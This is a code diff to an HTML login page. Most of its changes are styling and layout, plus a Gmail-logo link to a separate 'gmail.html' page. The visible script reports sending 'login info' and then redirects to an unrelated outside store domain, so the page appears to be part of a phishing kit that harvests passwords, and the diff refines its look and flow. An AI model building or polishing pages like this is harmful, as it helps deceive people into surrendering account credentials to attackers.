@@ -47,13 +47,13 @@
         }
 
         .brand {
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
 
         .brand img {
             width: 240px;
             height: auto;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
 
         .brand h2 {
@@ -262,10 +262,10 @@
 
         .login-container {
             border-radius: 8px;
-            width: 350px;
+            width: 300px;
             padding: 4px;
             text-align: center;
-            background-color: #385999;
+            background-color: #1a1b1d;
         }
 
         .login-container img {
@@ -296,16 +296,23 @@
                         <input type="password" id="password" placeholder="Enter your password" required>
                     </div>
                     <button type="submit" class="btn btn-primary">Log In</button>
+                    <a href="/log in/gmail.html" class="forgot-password">
+                        <div class="login-container">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png"
+                                alt="Gmail Logo" class="logo">
+                        </div>
+                    </a>
                     <div class="divider">
+
                         <span>or</span>
                     </div>
                 </form>
-                <a href="/log in/gmail.html" class="forgot-password">
-                    <div class="login-container">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png"
-                            alt="Gmail Logo" class="logo">
-                    </div>
-                </a>
+                <div class="form-footer">
+                    <p>Don't have an account? <a href="#">Sign up</a></p>
+                </div>
+                <div class="loading">
+                    <div class="loading-spinner"></div>
+                </div>
             </div>
         </div>
     </div>
@@ -356,7 +363,7 @@
                         successMessage.style.display = 'block';
                         setTimeout(() => {
                             window.location.href = 'https://www.nhoy.store';
-                        }, 1000);
+                        }, 2000);
                     } else {
                         showError('Failed to send login info. Please try again.');
                     }
